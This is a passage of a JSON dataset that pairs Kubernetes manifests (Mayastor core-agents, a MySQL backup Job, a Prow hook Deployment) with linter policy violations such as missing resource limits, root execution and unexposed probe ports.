    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nats-probe\" has cpu request 0"
  },
  {
    "id": "6966",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"etcd-probe\" has memory limit 0"
  },
  {
    "id": "6967",
    "manifest_path": "data/manifests/the_stack_sample/sample_2539.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: core-agents\n  namespace: mayastor\n  labels:\n    app: core-agents\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: core-agents\n  template:\n    metadata:\n      labels:\n        app: core-agents\n    spec:\n      initContainers:\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz nats 4222; do echo \"Waiting for nats...\";\n          sleep 1; done;\n        image: busybox:latest\n        name: nats-probe\n      - command:\n        - sh\n        - -c\n        - trap \"exit 1\" TERM; until nc -vz mayastor-etcd-client 2379; do echo \"Waiting\n          for etcd...\"; sleep 1; done;\n        image: busybox:latest\n        name: etcd-probe\n      containers:\n      - name: core\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 32Mi\n          requests:\n            cpu: 500m\n            memory: 16Mi\n        image: mayadata/mcp-core:v1.0.1\n        imagePullPolicy: IfNotPresent\n        args:\n        - -smayastor-etcd-client\n        - -nnats\n        - --request-timeout=5s\n        - --cache-period=30s\n        env:\n        - name: RUST_LOG\n          value: info\n        - name: MY_POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: MY_POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nats-probe\" has memory limit 0"
  },
  {
    "id": "6968",
    "manifest_path": "data/manifests/the_stack_sample/sample_2540.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: mysql-backup-onetime\n  namespace: fabricnlp\nspec:\n  template:\n    spec:\n      containers:\n      - name: mysql-backup-onetime\n        image: healthcatalyst/fabric.mysqlclient\n        imagePullPolicy: Always\n        args:\n        - backup\n        env:\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysqlpassword\n              key: password\n        - name: MYSQL_DATABASE\n          value: nlpmt\n        - name: MYSQL_USER\n          value: NLP_APP_USER\n        - name: MYSQL_SERVER\n          value: mysqlserver\n        - name: BACKUP_NAME_PREFIX\n          value: nlpsql\n        volumeMounts:\n        - name: mysql-persistent-storage-backup\n          mountPath: /var/lib/mysql\n          subPath: mysqlbackups\n      volumes:\n      - name: mysql-persistent-storage-backup\n        persistentVolumeClaim:\n          claimName: nlp.mysqlbackup\n",
    "policy_id": "job-ttl-seconds-after-finished",
    "violation_text": "Standalone Job does not specify ttlSecondsAfterFinished"
  },
  {
    "id": "6969",
    "manifest_path": "data/manifests/the_stack_sample/sample_2540.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: mysql-backup-onetime\n  namespace: fabricnlp\nspec:\n  template:\n    spec:\n      containers:\n      - name: mysql-backup-onetime\n        image: healthcatalyst/fabric.mysqlclient\n        imagePullPolicy: Always\n        args:\n        - backup\n        env:\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysqlpassword\n              key: password\n        - name: MYSQL_DATABASE\n          value: nlpmt\n        - name: MYSQL_USER\n          value: NLP_APP_USER\n        - name: MYSQL_SERVER\n          value: mysqlserver\n        - name: BACKUP_NAME_PREFIX\n          value: nlpsql\n        volumeMounts:\n        - name: mysql-persistent-storage-backup\n          mountPath: /var/lib/mysql\n          subPath: mysqlbackups\n      volumes:\n      - name: mysql-persistent-storage-backup\n        persistentVolumeClaim:\n          claimName: nlp.mysqlbackup\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mysql-backup-onetime\" is using an invalid container image, \"healthcatalyst/fabric.mysqlclient\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "6970",
    "manifest_path": "data/manifests/the_stack_sample/sample_2540.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: mysql-backup-onetime\n  namespace: fabricnlp\nspec:\n  template:\n    spec:\n      containers:\n      - name: mysql-backup-onetime\n        image: healthcatalyst/fabric.mysqlclient\n        imagePullPolicy: Always\n        args:\n        - backup\n        env:\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysqlpassword\n              key: password\n        - name: MYSQL_DATABASE\n          value: nlpmt\n        - name: MYSQL_USER\n          value: NLP_APP_USER\n        - name: MYSQL_SERVER\n          value: mysqlserver\n        - name: BACKUP_NAME_PREFIX\n          value: nlpsql\n        volumeMounts:\n        - name: mysql-persistent-storage-backup\n          mountPath: /var/lib/mysql\n          subPath: mysqlbackups\n      volumes:\n      - name: mysql-persistent-storage-backup\n        persistentVolumeClaim:\n          claimName: nlp.mysqlbackup\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mysql-backup-onetime\" does not have a read-only root file system"
  },
  {
    "id": "6971",
    "manifest_path": "data/manifests/the_stack_sample/sample_2540.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: mysql-backup-onetime\n  namespace: fabricnlp\nspec:\n  template:\n    spec:\n      containers:\n      - name: mysql-backup-onetime\n        image: healthcatalyst/fabric.mysqlclient\n        imagePullPolicy: Always\n        args:\n        - backup\n        env:\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysqlpassword\n              key: password\n        - name: MYSQL_DATABASE\n          value: nlpmt\n        - name: MYSQL_USER\n          value: NLP_APP_USER\n        - name: MYSQL_SERVER\n          value: mysqlserver\n        - name: BACKUP_NAME_PREFIX\n          value: nlpsql\n        volumeMounts:\n        - name: mysql-persistent-storage-backup\n          mountPath: /var/lib/mysql\n          subPath: mysqlbackups\n      volumes:\n      - name: mysql-persistent-storage-backup\n        persistentVolumeClaim:\n          claimName: nlp.mysqlbackup\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mysql-backup-onetime\" is not set to runAsNonRoot"
  },
  {
    "id": "6972",
    "manifest_path": "data/manifests/the_stack_sample/sample_2540.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: mysql-backup-onetime\n  namespace: fabricnlp\nspec:\n  template:\n    spec:\n      containers:\n      - name: mysql-backup-onetime\n        image: healthcatalyst/fabric.mysqlclient\n        imagePullPolicy: Always\n        args:\n        - backup\n        env:\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysqlpassword\n              key: password\n        - name: MYSQL_DATABASE\n          value: nlpmt\n        - name: MYSQL_USER\n          value: NLP_APP_USER\n        - name: MYSQL_SERVER\n          value: mysqlserver\n        - name: BACKUP_NAME_PREFIX\n          value: nlpsql\n        volumeMounts:\n        - name: mysql-persistent-storage-backup\n          mountPath: /var/lib/mysql\n          subPath: mysqlbackups\n      volumes:\n      - name: mysql-persistent-storage-backup\n        persistentVolumeClaim:\n          claimName: nlp.mysqlbackup\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mysql-backup-onetime\" has cpu request 0"
  },
  {
    "id": "6973",
    "manifest_path": "data/manifests/the_stack_sample/sample_2540.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: mysql-backup-onetime\n  namespace: fabricnlp\nspec:\n  template:\n    spec:\n      containers:\n      - name: mysql-backup-onetime\n        image: healthcatalyst/fabric.mysqlclient\n        imagePullPolicy: Always\n        args:\n        - backup\n        env:\n        - name: MYSQL_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mysqlpassword\n              key: password\n        - name: MYSQL_DATABASE\n          value: nlpmt\n        - name: MYSQL_USER\n          value: NLP_APP_USER\n        - name: MYSQL_SERVER\n          value: mysqlserver\n        - name: BACKUP_NAME_PREFIX\n          value: nlpsql\n        volumeMounts:\n        - name: mysql-persistent-storage-backup\n          mountPath: /var/lib/mysql\n          subPath: mysqlbackups\n      volumes:\n      - name: mysql-persistent-storage-backup\n        persistentVolumeClaim:\n          claimName: nlp.mysqlbackup\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mysql-backup-onetime\" has memory limit 0"
  },
  {
    "id": "6974",
    "manifest_path": "data/manifests/the_stack_sample/sample_2541.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210915-80100106cc\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "6975",
    "manifest_path": "data/manifests/the_stack_sample/sample_2541.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210915-80100106cc\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "6976",
    "manifest_path": "data/manifests/the_stack_sample/sample_2541.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210915-80100106cc\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "6977",
    "manifest_path": "data/manifests/the_stack_sample/sample_2541.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210915-80100106cc\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "6978",
    "manifest_path": "data/manifests/the_stack_sample/sample_2541.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210915-80100106cc\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "6979",
    "manifest_path": "data/manifests/the_stack_sample/sample_2541.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210915-80100106cc\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "6980",
    "manifest_path": "data/manifests/the_stack_sample/sample_2541.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210915-80100106cc\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "6981",
    "manifest_path": "data/manifests/the_stack_sample/sample_2541.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210915-80100106cc\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 